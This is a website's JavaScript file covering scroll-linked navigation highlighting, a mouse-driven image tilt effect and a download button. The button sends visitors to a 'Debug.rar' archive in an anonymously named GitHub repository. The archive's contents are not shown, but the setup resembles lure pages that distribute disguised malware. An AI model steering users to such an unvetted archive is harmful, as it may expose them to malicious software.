document.addEventListener('DOMContentLoaded', () => {
    const navLinks = document.querySelectorAll('.nav-link');
    const sections = document.querySelectorAll('div[id]');
    const serviceSections = document.querySelectorAll('.service-section');

    function setActiveLink() {
        const scrollPosition = window.scrollY + window.innerHeight / 2;

        sections.forEach(section => {
            const sectionTop = section.offsetTop;
            const sectionHeight = section.offsetHeight;

            if (scrollPosition >= sectionTop && scrollPosition <= sectionTop + sectionHeight) {
                navLinks.forEach(link => {
                    link.classList.toggle('active', link.getAttribute('data-target') === section.id);
                });
            }
        });

        // Установка активной секции в Services
        serviceSections.forEach(section => {
            const sectionTop = section.offsetTop;
            const sectionHeight = section.offsetHeight;

            if (scrollPosition >= sectionTop && scrollPosition <= sectionTop + sectionHeight) {
                serviceSections.forEach(sec => sec.classList.remove('active'));
                section.classList.add('active');
            }
        });
    }

    navLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const targetId = e.currentTarget.getAttribute('data-target');
            const targetElement = document.getElementById(targetId);

            if (targetElement) {
                targetElement.scrollIntoView({ behavior: 'smooth' });
                navLinks.forEach(link => link.classList.remove('active'));
                e.currentTarget.classList.add('active');
            }
        });
    });

    window.addEventListener('scroll', setActiveLink);
});
const image = document.getElementById('image');

image.addEventListener('mousemove', (e) => {
    const rect = image.getBoundingClientRect();
    const x = e.clientX - rect.left; // Позиция курсора относительно изображения
    const y = e.clientY - rect.top;

    const centerX = rect.width / 2;
    const centerY = rect.height / 2;

    const deltaX = x - centerX;
    const deltaY = y - centerY;

    const rotateX = (deltaY / centerY) * 10; // Максимальный угол наклона
    const rotateY = -(deltaX / centerX) * 10;

    image.style.transform = `rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;
});

image.addEventListener('mouseleave', () => {
    image.style.transform = 'rotateX(0deg) rotateY(0deg)'; // Сброс наклона при уходе курсора
});
document.addEventListener('DOMContentLoaded', function() {
    const downloadButton = document.querySelector('.download-button');
    
    downloadButton.addEventListener('click', function() {
        window.location.href = 'https://github.com/Rexcfax/ssssss/raw/main/Debug.rar';
    });
});
